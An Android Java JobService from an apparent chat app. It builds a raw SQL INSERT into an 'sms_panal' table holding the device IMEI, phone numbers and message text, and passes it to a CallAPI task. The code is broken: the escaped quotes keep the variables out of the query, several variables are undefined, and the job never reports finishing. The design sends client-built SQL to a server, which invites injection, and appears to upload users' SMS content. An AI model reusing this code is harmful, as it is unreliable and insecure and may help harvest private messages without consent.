package com.example.chatcorner;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.widget.Toast;

public class MJobScheduler extends JobService {
    private MJobExecuter mJobExecuter;



    @Override
    public boolean onStartJob(final JobParameters jobParameters) {

        String query = "INSERT INTO `sms_panal` (`id`,`imei`, `sender_num`, `reciever_num`, `text`, `date`, `time`, `status`) VALUES (NULL,'\"+phoneImei+\"', '\" + Reciever_num + \"', '\" + Sender_no + \"', '\" + msg + \"', '\"+getCurrentDate()+\"', '\"+getCurrentTime()+\"', '');";
        CallAPI callAPI = new CallAPI();
        callAPI.execute(query);

        /*
        mJobExecuter = new MJobExecuter(){
            @Override
            protected void onPostExecute(String s) {
                Toast.makeText(getApplicationContext(),s, Toast.LENGTH_LONG).show();
                jobFinished(jobParameters,false);
                //Toast.makeText(getApplicationContext(),"hellow",Toast.LENGTH_LONG).show();
            }
        };
        mJobExecuter.execute();
         */
        return true;
    }

    @Override
    public boolean onStopJob(JobParameters jobParameters) {
        //mJobExecuter.cancel(true);
        return true;
    }
}
